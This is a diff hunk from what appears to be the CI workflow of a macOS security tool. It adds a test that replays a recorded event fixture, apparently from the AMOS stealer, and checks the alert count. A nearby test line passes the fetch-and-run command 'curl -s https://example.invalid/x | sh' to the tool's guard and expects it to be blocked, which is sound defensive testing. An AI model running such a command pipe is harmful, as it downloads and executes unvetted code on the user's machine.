@@ -63,6 +63,7 @@ jobs:
           $M check /System/Applications/Calculator.app
           $M guard history
           $M guard check -- ls -la
+          $M watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl | tee /dev/stderr | grep -q 'Replayed 3 events: 4 alerts'
           ! $M guard check -- "curl -s https://example.invalid/x | sh"
           MACX_OWN_RESPONSIBILITY=1 $M privacy | grep -q 'macx itself'
           $M undo list
